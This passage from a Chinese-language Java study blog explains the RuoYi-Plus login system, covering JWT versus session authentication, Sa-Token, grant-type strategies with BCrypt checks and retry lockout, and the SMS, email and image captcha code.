    <content type="html"><![CDATA[<p>登陆系统是大多数系统都有的，其实现上不难，完成注册和登录即可，但要想写一个功能齐全能在生产环境使用的登录系统，要考虑的内容还是有很多的。本文基于RuoYi-Plus框架记录一下它的登录系统的实现。</p><h2 id="注册登录"><a href="#注册登录" class="headerlink" title="注册登录"></a>注册登录</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>登录系统最重要的莫过于对密码进行加密，密码是严禁采用明文的形式存储到数据库中的，加密算法一般为BCrypt，加密部分可以见文章 “密码学学习”</p><h2 id="保存登录状态"><a href="#保存登录状态" class="headerlink" title="保存登录状态"></a>保存登录状态</h2><p>一个系统不可能每次使用都要重新登录，不然会给用户带来极差的体验，所以一般都会保存用户的登录状态，让用户第二次打开的时候可以免去登录直接使用，根据系统的安全性来设计登录状态的保存时间，保存的具体方式一般为两种：基于token的验证和基于session的验证。</p><h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><p>在许多场景中，术语 “token” 可以指代不同类型的令牌，包括但不限于：</p><ol><li><strong>JWT（JSON Web Token）：</strong> 是一种使用 JSON 格式编码的 token，通常包含有关用户身份和其他声明的信息。JWT 具有自包含性，可以在多个服务之间传递，用于实现身份验证和授权。</li><li><strong>Access Token（访问令牌）：</strong> 通常指的是 OAuth 2.0 中的访问令牌，用于授权客户端访问受保护资源。Access Token 可以是 JWT 格式的，也可以是其他格式。</li><li><strong>Refresh Token（刷新令牌）：</strong> 也是 OAuth 2.0 中的一种令牌，用于在 Access Token 过期或失效时获取新的 Access Token。</li><li><strong>Session Token（会话令牌）：</strong> 在传统的 Web 应用程序中，用于标识用户会话的令牌，通常存储在用户的浏览器 Cookie 中。</li></ol><p>下文中的token是指JWT，先简单介绍一下JWT</p><h4 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h4><p>JSON Web Token（JWT）是一种开放标准（RFC 7519），用于在两个实体之间安全地传递信息。它是一种紧凑且独立的方式，用于在各方之间作为 JSON 对象安全地传输信息。JWT 可以在用户和服务之间传递声明（Claims），以便在各方之间安全地传输信息。这些声明可以被验证，因此接收方可以信任这些声明。</p><p>JWT 由三部分组成，每个部分之间使用点（<code>.</code>）进行分隔：</p><ol><li><strong>Header（头部）：</strong> 包含了两部分信息，声明类型（<code>typ</code>）和使用的签名算法（<code>alg</code>）。</li><li><strong>Payload（负载）：</strong> 包含了一系列声明（Claims），是实际传输的数据。</li><li><strong>Signature（签名）：</strong> 对前两部分的签名，以确保数据的完整性和验证发送方的身份。<ul><li>使用 Base64 编码的 Header 和 Payload 组成一个字符串，用<code>.</code>连接。</li><li>使用事先约定好的密钥对这个字符串进行加密，得到签名</li></ul></li></ol><h4 id="用户登录过程："><a href="#用户登录过程：" class="headerlink" title="用户登录过程："></a>用户登录过程：</h4><ol><li><strong>用户发起登录请求：</strong> 用户提供用户名和密码，发送登录请求到服务器。</li><li><strong>服务器验证用户身份：</strong> 服务器验证用户提供的用户名和密码是否匹配。如果验证成功，服务器生成一个包含用户信息的令牌（Token）。</li><li><strong>令牌生成：</strong> 生成的Token通常包括以下信息：<ul><li>用户ID</li><li>过期时间（Token的有效期限）</li><li>其他必要的信息，如用户角色、权限等</li></ul></li><li><strong>令牌返回给客户端：</strong> 服务器将生成的Token作为响应返回给客户端。</li><li><strong>客户端存储Token：</strong> 客户端通常将Token存储在本地，如浏览器的LocalStorage或应用程序的内存中。</li></ol><h4 id="后续请求的认证："><a href="#后续请求的认证：" class="headerlink" title="后续请求的认证："></a>后续请求的认证：</h4><ol><li><strong>用户发起受保护资源的请求：</strong> 用户在登录后，发送请求访问需要身份验证的资源。</li><li><strong>Token发送到服务器：</strong> 客户端将存储的Token放入请求的头部（通常是Authorization头）中，发送到服务器。</li><li><strong>服务器验证Token：</strong> 服务器收到请求后，解析Token，验证其有效性和是否过期。</li><li><strong>访问控制：</strong> 如果Token有效，服务器会根据Token中包含的用户信息进行访问控制，决定是否允许用户访问请求的资源。</li><li><strong>响应：</strong> 服务器返回请求资源的响应，或者如果Token无效，则返回相应的错误信息。</li></ol><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><h4 id="用户登录过程：-1"><a href="#用户登录过程：-1" class="headerlink" title="用户登录过程："></a>用户登录过程：</h4><ol><li><strong>用户发起登录请求：</strong> 用户提供用户名和密码，发送登录请求到服务器。</li><li><strong>服务器验证用户身份：</strong> 服务器验证用户提供的用户名和密码是否匹配。如果验证成功，服务器创建一个会话（Session）并在服务器端存储用户的会话信息。</li><li><strong>会话ID生成：</strong> 为了唯一标识用户的会话，服务器生成一个唯一的会话ID。这个ID通常是一个长字符串或数字。</li><li><strong>会话信息存储：</strong> 用户的会话信息（如用户ID、角色、权限等）被存储在服务器端的一个数据结构中，通常是在内存中或者持久化存储中。</li><li><strong>会话ID返回给客户端：</strong> 服务器将生成的会话ID发送给客户端，通常通过设置一个名为<code>JSESSIONID</code>的Cookie。</li></ol><h4 id="后续请求的认证：-1"><a href="#后续请求的认证：-1" class="headerlink" title="后续请求的认证："></a>后续请求的认证：</h4><ol><li><strong>用户发起受保护资源的请求：</strong> 用户在登录后，发送请求访问需要身份验证的资源。</li><li><strong>会话ID发送到服务器：</strong> 客户端将包含会话ID的Cookie放入请求头中，发送到服务器。</li><li><strong>服务器验证会话ID：</strong> 服务器收到请求后，根据会话ID查找存储在服务器端的会话信息。</li><li><strong>访问控制：</strong> 如果找到会话信息，服务器根据会话信息进行访问控制，决定是否允许用户访问请求的资源。</li><li><strong>响应：</strong> 服务器返回请求资源的响应，或者如果未通过身份验证，则返回相应的错误信息。</li></ol><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><p>Session相对来说是比较传统的Web应用解决方案，主要问题有：</p><p>1、数据需要存储在服务器中，对于用户量大的系统内存占用很明显</p><p>2、对于分布式系统，需要额外的处理来管理Session状态，因为采用默认的负载均衡策略在A服务器登陆后，请求发送到B服务器是需要再次登录的。一般采用的策略有通过路由策略将客户端绑定到固定服务器上，或者将Session状态存储在Redis缓存中。</p><p>而Token是基于Session的问题进行改进得来的，它也有问题，即利用了时间换空间，其节省了服务器的内存资源，但是需要耗费CPU去计算token来进行验证。</p><h3 id="Sa-token"><a href="#Sa-token" class="headerlink" title="Sa-token"></a>Sa-token</h3><p><strong>Sa-Token</strong> 是一个轻量级 Java 权限认证框架，主要解决：<strong>登录认证</strong>、<strong>权限认证</strong>、<strong>单点登录</strong>、<strong>OAuth2.0</strong>、<strong>分布式Session会话</strong>、<strong>微服务网关鉴权</strong> 等一系列权限相关问题。相比于Shiro、SpringSecurity 等框架的繁多配置，Sa-Token的API设计简洁优雅的多，可以使用其来作为鉴权框架。文档：<a href="https://sa-token.cc/doc.html#/">框架介绍 (sa-token.cc)</a></p><h2 id="第三方登录认证"><a href="#第三方登录认证" class="headerlink" title="第三方登录认证"></a>第三方登录认证</h2><p>该系统有五种登录认证方式，分别为Email认证、Password认证、Sms短信认证、Social社交平台认证、Xcx认证，在登录的请求传进来的时候，需要根据传入请求携带的授权类型<code>grantType</code>调用对应的认证服务。</p><p>Social社交平台认证是通过开源项目<code>JustAuth</code>实现，其支持大量第三方平台的OAuth登录。项目地址：<a href="https://gitee.com/yadong.zhang/JustAuth">https://gitee.com/yadong.zhang/JustAuth</a></p><p>Xcx认证是微信小程序调用授权，这个功能项目中只写了接口，具体实现并没有完成，也不太了解这个认证。</p><p>授权策略接口<code>IAuthStrategy</code>，对应的实现仅需重写login方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 授权策略</span><br><span class="line"> *</span><br><span class="line"> * @author Michelle.Chung</span><br><span class="line"> */</span><br><span class="line">public interface IAuthStrategy &#123;</span><br><span class="line"></span><br><span class="line">    String BASE_NAME = &quot;AuthStrategy&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 登录</span><br><span class="line">     */</span><br><span class="line">    static LoginVo login(String body, SysClient client, String grantType) &#123;</span><br><span class="line">        // 授权类型和客户端id</span><br><span class="line">        String beanName = grantType + BASE_NAME;</span><br><span class="line">        if (!SpringUtils.containsBean(beanName)) &#123;</span><br><span class="line">            throw new ServiceException(&quot;授权类型不正确!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        IAuthStrategy instance = SpringUtils.getBean(beanName);</span><br><span class="line">        return instance.login(body, client);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 登录</span><br><span class="line">     */</span><br><span class="line">    LoginVo login(String body, SysClient client);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里举例，列出：通过密码登录的实现<code>PasswordAuthStrategy</code> 重写该接口的源码，其他的登陆方式基本大差不差。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public LoginVo login(String body, SysClient client) &#123;</span><br><span class="line">    PasswordLoginBody loginBody = JsonUtils.parseObject(body, PasswordLoginBody.class);</span><br><span class="line">    ValidatorUtils.validate(loginBody);</span><br><span class="line">    String tenantId = loginBody.getTenantId();</span><br><span class="line">    String username = loginBody.getUsername();</span><br><span class="line">    String password = loginBody.getPassword();</span><br><span class="line">    String code = loginBody.getCode();</span><br><span class="line">    String uuid = loginBody.getUuid();</span><br><span class="line"></span><br><span class="line">    boolean captchaEnabled = captchaProperties.getEnable();</span><br><span class="line">    // 验证码开关</span><br><span class="line">    if (captchaEnabled) &#123;</span><br><span class="line">        validateCaptcha(tenantId, username, code, uuid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SysUserVo user = loadUserByUsername(tenantId, username);</span><br><span class="line">    loginService.checkLogin(LoginType.PASSWORD, tenantId, username, () -&gt; !BCrypt.checkpw(password, user.getPassword()));</span><br><span class="line">    // 此处可根据登录用户的数据不同 自行创建 loginUser</span><br><span class="line">    LoginUser loginUser = loginService.buildLoginUser(user);</span><br><span class="line">    loginUser.setClientKey(client.getClientKey());</span><br><span class="line">    loginUser.setDeviceType(client.getDeviceType());</span><br><span class="line">    SaLoginModel model = new SaLoginModel();</span><br><span class="line">    model.setDevice(client.getDeviceType());</span><br><span class="line">    // 自定义分配 不同用户体系 不同 token 授权时间 不设置默认走全局 yml 配置</span><br><span class="line">    // 例如: 后台用户30分钟过期 app用户1天过期</span><br><span class="line">    model.setTimeout(client.getTimeout());</span><br><span class="line">    model.setActiveTimeout(client.getActiveTimeout());</span><br><span class="line">    model.setExtra(LoginHelper.CLIENT_KEY, client.getClientId());</span><br><span class="line">    // 生成token</span><br><span class="line">    LoginHelper.login(loginUser, model);</span><br><span class="line"></span><br><span class="line">    loginService.recordLogininfor(loginUser.getTenantId(), username, Constants.LOGIN_SUCCESS, MessageUtils.message(&quot;user.login.success&quot;));</span><br><span class="line">    loginService.recordLoginInfo(user.getUserId());</span><br><span class="line"></span><br><span class="line">    LoginVo loginVo = new LoginVo();</span><br><span class="line">    loginVo.setAccessToken(StpUtil.getTokenValue());</span><br><span class="line">    loginVo.setExpireIn(StpUtil.getTokenTimeout());</span><br><span class="line">    loginVo.setClientId(client.getClientId());</span><br><span class="line">    return loginVo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不同的登录策略最后的登录校验调用的都为login方法，但这里实际上只是一个错误次数的判断，真实的校验是在调用这个方法的时候传入的参数<code>supplier</code>，例如在上面代码中传入参数是<code>() -&gt; !BCrypt.checkpw(password, user.getPassword())</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * 登录校验</span><br><span class="line">     */</span><br><span class="line">    public void checkLogin(LoginType loginType, String tenantId, String username, Supplier&lt;Boolean&gt; supplier) &#123;</span><br><span class="line">        String errorKey = GlobalConstants.PWD_ERR_CNT_KEY + username;</span><br><span class="line">        String loginFail = Constants.LOGIN_FAIL;</span><br><span class="line"></span><br><span class="line">        // 获取用户登录错误次数，默认为0 (可自定义限制策略 例如: key + username + ip)</span><br><span class="line">        int errorNumber = ObjectUtil.defaultIfNull(RedisUtils.getCacheObject(errorKey), 0);</span><br><span class="line">        // 锁定时间内登录 则踢出</span><br><span class="line">        if (errorNumber &gt;= maxRetryCount) &#123;</span><br><span class="line">            recordLogininfor(tenantId, username, loginFail, MessageUtils.message(loginType.getRetryLimitExceed(), maxRetryCount, lockTime));</span><br><span class="line">            throw new UserException(loginType.getRetryLimitExceed(), maxRetryCount, lockTime);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (supplier.get()) &#123;</span><br><span class="line">            // 错误次数递增</span><br><span class="line">            errorNumber++;</span><br><span class="line">            RedisUtils.setCacheObject(errorKey, errorNumber, Duration.ofMinutes(lockTime));</span><br><span class="line">            // 达到规定错误次数 则锁定登录</span><br><span class="line">            if (errorNumber &gt;= maxRetryCount) &#123;</span><br><span class="line">                recordLogininfor(tenantId, username, loginFail, MessageUtils.message(loginType.getRetryLimitExceed(), maxRetryCount, lockTime));</span><br><span class="line">                throw new UserException(loginType.getRetryLimitExceed(), maxRetryCount, lockTime);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // 未达到规定错误次数</span><br><span class="line">                recordLogininfor(tenantId, username, loginFail, MessageUtils.message(loginType.getRetryLimitCount(), errorNumber));</span><br><span class="line">                throw new UserException(loginType.getRetryLimitCount(), errorNumber);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 登录成功 清空错误次数</span><br><span class="line">        RedisUtils.deleteObject(errorKey);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>生成验证码，RuoYi-Plus支持SMS短信验证码、邮箱验证码和生成图片验证码，</p><p>短信验证码用到了开源项目sms4j，项目地址为：<a href="https://gitee.com/dromara/sms4j">https://gitee.com/dromara/sms4j</a> 。</p><p>邮件验证码是单独写了一个工具模块，代码挺多的，其核心是采用jakarta.mail实现，代码就不放了（我在hutool里面发现也有邮件验证码的工具包，但项目并没采用）</p><p>图片的验证码采用的hutool工具，文档为：<a href="https://doc.hutool.cn/pages/captcha/#%E4%BB%8B%E7%BB%8D">概述 | Hutool</a>，但没直接使用，而是实现CodeGenerator接口后自己实现了一个计算生成器。</p><p>验证码操作相关代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 验证码操作处理</span><br><span class="line"> *</span><br><span class="line"> * @author Lion Li</span><br><span class="line"> */</span><br><span class="line">@SaIgnore</span><br><span class="line">@Slf4j</span><br><span class="line">@Validated</span><br><span class="line">@RequiredArgsConstructor</span><br><span class="line">@RestController</span><br><span class="line">public class CaptchaController &#123;</span><br><span class="line"></span><br><span class="line">    private final CaptchaProperties captchaProperties;</span><br><span class="line">    private final MailProperties mailProperties;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 短信验证码</span><br><span class="line">     *</span><br><span class="line">     * @param phonenumber 用户手机号</span><br><span class="line">     */</span><br><span class="line">    @GetMapping(&quot;/resource/sms/code&quot;)</span><br><span class="line">    public R&lt;Void&gt; smsCode(@NotBlank(message = &quot;&#123;user.phonenumber.not.blank&#125;&quot;) String phonenumber) &#123;</span><br><span class="line">        String key = GlobalConstants.CAPTCHA_CODE_KEY + phonenumber;</span><br><span class="line">        String code = RandomUtil.randomNumbers(4);</span><br><span class="line">        RedisUtils.setCacheObject(key, code, Duration.ofMinutes(Constants.CAPTCHA_EXPIRATION));</span><br><span class="line">        // 验证码模板id 自行处理 (查数据库或写死均可)</span><br><span class="line">        String templateId = &quot;&quot;;</span><br><span class="line">        LinkedHashMap&lt;String, String&gt; map = new LinkedHashMap&lt;&gt;(1);</span><br><span class="line">        map.put(&quot;code&quot;, code);</span><br><span class="line">        SmsBlend smsBlend = SmsFactory.createSmsBlend(SupplierType.ALIBABA);</span><br><span class="line">        SmsResponse smsResponse = smsBlend.sendMessage(phonenumber, templateId, map);</span><br><span class="line">        if (!&quot;OK&quot;.equals(smsResponse.getCode())) &#123;</span><br><span class="line">            log.error(&quot;验证码短信发送异常 =&gt; &#123;&#125;&quot;, smsResponse);</span><br><span class="line">            return R.fail(smsResponse.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        return R.ok();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 邮箱验证码</span><br><span class="line">     *</span><br><span class="line">     * @param email 邮箱</span><br><span class="line">     */</span><br><span class="line">    @GetMapping(&quot;/resource/email/code&quot;)</span><br><span class="line">    public R&lt;Void&gt; emailCode(@NotBlank(message = &quot;&#123;user.email.not.blank&#125;&quot;) String email) &#123;</span><br><span class="line">        if (!mailProperties.getEnabled()) &#123;</span><br><span class="line">            return R.fail(&quot;当前系统没有开启邮箱功能！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        String key = GlobalConstants.CAPTCHA_CODE_KEY + email;</span><br><span class="line">        String code = RandomUtil.randomNumbers(4);</span><br><span class="line">        RedisUtils.setCacheObject(key, code, Duration.ofMinutes(Constants.CAPTCHA_EXPIRATION));</span><br><span class="line">        try &#123;</span><br><span class="line">            MailUtils.sendText(email, &quot;登录验证码&quot;, &quot;您本次验证码为：&quot; + code + &quot;，有效性为&quot; + Constants.CAPTCHA_EXPIRATION + &quot;分钟，请尽快填写。&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            log.error(&quot;验证码短信发送异常 =&gt; &#123;&#125;&quot;, e.getMessage());</span><br><span class="line">            return R.fail(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        return R.ok();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 生成验证码</span><br><span class="line">     */</span><br><span class="line">    @GetMapping(&quot;/auth/code&quot;)</span><br><span class="line">    public R&lt;CaptchaVo&gt; getCode() &#123;</span><br><span class="line">        CaptchaVo captchaVo = new CaptchaVo();</span><br><span class="line">        boolean captchaEnabled = captchaProperties.getEnable();</span><br><span class="line">        if (!captchaEnabled) &#123;</span><br><span class="line">            captchaVo.setCaptchaEnabled(false);</span><br><span class="line">            return R.ok(captchaVo);</span><br><span class="line">        &#125;</span><br><span class="line">        // 保存验证码信息</span><br><span class="line">        String uuid = IdUtil.simpleUUID();</span><br><span class="line">        String verifyKey = GlobalConstants.CAPTCHA_CODE_KEY + uuid;</span><br><span class="line">        // 生成验证码</span><br><span class="line">        CaptchaType captchaType = captchaProperties.getType();</span><br><span class="line">        boolean isMath = CaptchaType.MATH == captchaType;</span><br><span class="line">        Integer length = isMath ? captchaProperties.getNumberLength() : captchaProperties.getCharLength();</span><br><span class="line">        CodeGenerator codeGenerator = ReflectUtils.newInstance(captchaType.getClazz(), length);</span><br><span class="line">        AbstractCaptcha captcha = SpringUtils.getBean(captchaProperties.getCategory().getClazz());</span><br><span class="line">        captcha.setGenerator(codeGenerator);</span><br><span class="line">        captcha.createCode();</span><br><span class="line">        String code = captcha.getCode();</span><br><span class="line">        if (isMath) &#123;</span><br><span class="line">            ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">            Expression exp = parser.parseExpression(StringUtils.remove(code, &quot;=&quot;));</span><br><span class="line">            code = exp.getValue(String.class);</span><br><span class="line">        &#125;</span><br><span class="line">        RedisUtils.setCacheObject(verifyKey, code, Duration.ofMinutes(Constants.CAPTCHA_EXPIRATION));</span><br><span class="line">        captchaVo.setUuid(uuid);</span><br><span class="line">        captchaVo.setImg(captcha.getImageBase64());</span><br><span class="line">        return R.ok(captchaVo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>校验验证码的方法如下：验证码的密码和过期时间存储在redis数据库中，直接读取之后校验就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 校验验证码</span><br><span class="line"> *</span><br><span class="line"> * @param username 用户名</span><br><span class="line"> * @param code     验证码</span><br><span class="line"> * @param uuid     唯一标识</span><br><span class="line"> */</span><br><span class="line">private void validateCaptcha(String tenantId, String username, String code, String uuid) &#123;</span><br><span class="line">    String verifyKey = GlobalConstants.CAPTCHA_CODE_KEY + StringUtils.defaultString(uuid, &quot;&quot;);</span><br><span class="line">    String captcha = RedisUtils.getCacheObject(verifyKey);</span><br><span class="line">    RedisUtils.deleteObject(verifyKey);</span><br><span class="line">    if (captcha == null) &#123;</span><br><span class="line">        loginService.recordLogininfor(tenantId, username, Constants.LOGIN_FAIL, MessageUtils.message(&quot;user.jcaptcha.expire&quot;));</span><br><span class="line">        throw new CaptchaExpireException();</span><br><span class="line">    &#125;</span><br><span class="line">    if (!code.equalsIgnoreCase(captcha)) &#123;</span><br><span class="line">        loginService.recordLogininfor(tenantId, username, Constants.LOGIN_FAIL, MessageUtils.message(&quot;user.jcaptcha.error&quot;));</span><br><span class="line">        throw new CaptchaException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h4 id="查询语句"><a href="#查询语句" class="headerlink" title="查询语句"></a>查询语句</h4><p>在RuoYi-plus项目中开发者使用了mybatis-plus进行查询，直接采用链式调用的方式而省去了sql语句，这种方式还没怎么使用过。简单记一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">private SysUserVo loadUserByUsername(String tenantId, String username) &#123;</span><br><span class="line">    SysUser user = userMapper.selectOne(new LambdaQueryWrapper&lt;SysUser&gt;()</span><br><span class="line">        .select(SysUser::getUserName, SysUser::getStatus)</span><br><span class="line">        .eq(TenantHelper.isEnable(), SysUser::getTenantId, tenantId)</span><br><span class="line">        .eq(SysUser::getUserName, username));</span><br><span class="line">    if (ObjectUtil.isNull(user)) &#123;</span><br><span class="line">        log.info(&quot;登录用户：&#123;&#125; 不存在.&quot;, username);</span><br><span class="line">        throw new UserException(&quot;user.not.exists&quot;, username);</span><br><span class="line">    &#125; else if (UserStatus.DISABLE.getCode().equals(user.getStatus())) &#123;</span><br><span class="line">        log.info(&quot;登录用户：&#123;&#125; 已被停用.&quot;, username);</span><br><span class="line">        throw new UserException(&quot;user.blocked&quot;, username);</span><br><span class="line">    &#125;</span><br><span class="line">    if (TenantHelper.isEnable()) &#123;</span><br><span class="line">        return userMapper.selectTenantUserByUserName(username, tenantId);</span><br><span class="line">    &#125;</span><br><span class="line">    return userMapper.selectUserByUserName(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的，PO对象就需要加上<code>@TableName(&quot;sys_user&quot;)</code>注解和其他的一些注解。</p><h4 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h4><p>&#x2F;&#x2F;TODO：目前只看了后端源码，并没有看前端源码，有点好奇前端是如何进行密码的加密然后传递到后端，后端又是怎么处理的，前端传递过来一个String，通过jackson工具将给定的 JSON 字符串转换为 LoginBody  对象</p><p>该对象中有 客户端id、授权类型、租户ID、验证码、唯一标识</p>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分布式系统操作互斥性与接口幂等性</title>
    <link href="/2023/12/19/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C%E4%BA%92%E6%96%A5%E6%80%A7%E4%B8%8E%E6%8E%A5%E5%8F%A3%E5%B9%82%E7%AD%89%E6%80%A7/"/>
    <url>/2023/12/19/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C%E4%BA%92%E6%96%A5%E6%80%A7%E4%B8%8E%E6%8E%A5%E5%8F%A3%E5%B9%82%E7%AD%89%E6%80%A7/</url>
    
